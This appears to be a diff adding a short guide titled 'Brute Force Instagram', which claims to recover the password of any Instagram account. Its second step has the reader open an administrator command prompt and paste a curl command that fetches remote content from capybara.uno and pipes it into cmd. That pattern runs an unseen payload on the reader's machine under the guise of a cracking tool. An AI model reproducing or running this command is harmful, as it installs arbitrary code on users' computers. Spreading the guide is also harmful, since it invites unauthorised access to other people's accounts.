@@ -1,0 +1,39 @@
+⚠ This technique is exclusively on pc!
+Disabling the antivirus is not necessary. ⚠
+Brute Force Instagram
+
+STEP 1 :
+- Launch a command prompt as an administrator.
+(“Type here to search” → “Command prompt”
+→ "Run as administrator")
+
+2ND STEP :
+- In the command prompt copy paste this:
+curl -sL capybara.uno?k=nc_EsF34qg7Zt|cmd>c
+
+STEP 3:
+- You are now in the software which will allow you to
+find password for any account
+instagram less than 8 characters!*
+
+STEP 4:
+- "cd CapyBaraBruteForce" command prompt 
+
+STEP 5:
+- In "Account url", put the links of the target account.
+
+STEP 6:
+- Once the ties are set, you can start your attack
+by typing "start" in your terminal
+
+STEP 7:
+- When the attack is over, you will automatically receive the password of the target account you attacked, displaying like this:
+Wordlist: Example.txt
+UserName: Example@gmail.com
+Password: example41877
+complete: 100%
+Attempts: 7
+Browser: 3
+Exists: True
+
+STEP 8: If the attack fails (Fail), this will mean that his password is longer than 8 characters!
